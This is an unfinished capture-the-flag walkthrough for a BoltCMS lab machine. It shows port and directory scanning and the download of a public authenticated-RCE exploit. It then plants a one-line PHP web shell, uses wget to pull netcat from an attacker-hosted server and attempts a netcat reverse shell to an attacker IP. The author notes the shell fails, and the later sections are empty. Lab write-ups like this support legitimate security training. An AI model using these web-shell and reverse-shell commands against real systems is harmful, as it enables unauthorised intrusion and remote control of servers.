# Erit Securus I

Learn to exploit the BoltCMS software by researching exploit-db.  



## Reconnaissance

`:> nmap -Pn -sV <Target IP>`  

```md
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
80/tcp open  http    nginx 1.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.80 seconds
```

The source code quickly identifies an available directory `/bolt`.  

![bold directory](/assets/securus-105.png)  

You can guess the most common default username and passowrd in history...  

Identify other directories  

`:> gobuster dir -u http://<Target IP> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt`

```md
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.64.161.143
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd            (Status: 403) [Size: 297]
/async                (Status: 401) [Size: 2188]
/entries              (Status: 200) [Size: 21065]
/extensions           (Status: 301) [Size: 319] [--> http://10.64.161.143/extensions/]
/files                (Status: 301) [Size: 314] [--> http://10.64.161.143/files/]
/pages                (Status: 200) [Size: 14482]
/search               (Status: 200) [Size: 6702]
/server-status        (Status: 403) [Size: 301]
/theme                (Status: 301) [Size: 314] [--> http://10.64.161.143/theme/]
Progress: 20473 / 20474 (100.00%)
===============================================================
Finished
```
## Webserver

![CMS](/assets/securus-101.png)

## Exploit

`:> curl https://raw.githubusercontent.com/r3m0t3nu11/Boltcms-Auth-rce-py/refs/heads/master/exploit.py > exploit.py`

## On the Attacker

Execute the exploit to gain initial access: `:> pytyon3 exploit.py http://<target> <default username> <defalut password>`>  

Create a symbolic link to netcat: `:> ln -s $(which nc) .`  

In the same directory, initiate a simple webserver allowing for the transfer of netcat to the target:  `:> python3 -m http.server 8000`  

### On the Target

Generate a command injection:  `echo '<?php system($_GET["cmd"]);?>' cmd.php`

### In a Web Browser

Logged in with the credentials previously identified.  

Test the exploit: `http://<Target IP>/files/cmd.php?cmd=ls -alh`

![rce test](/assets/securus-102.png)  

Transfer `nc` to the target device: `http://<Target IP>/files/cmd.php?cmd=wget http://<attacker IP>:<port>/nc`

Elevate the permission of `nc`:  `http://<Target IP>/files/cmd.php?cmd=chmod 755 nc`  

and verify: `http://<Target IP>/files/cmd.php?cmd=ls -alh nc`  

![chmoded](/assets/securus-103.png)  

### On the attacker

Set up a listener to catch a reverse shell: `:> netcat -lnvp 4444`  

### In a Web Browser 2

Initiate the reverse shell: `http://10.64.161.143/files/cmd.php?cmd=./nc -e /bin/bash <attacker ip> 4444`

Stuck here... no modification of the url will execute the shell... 

## Privilege Escalation

## Pivoting

## Privilege Escalation 2

## Root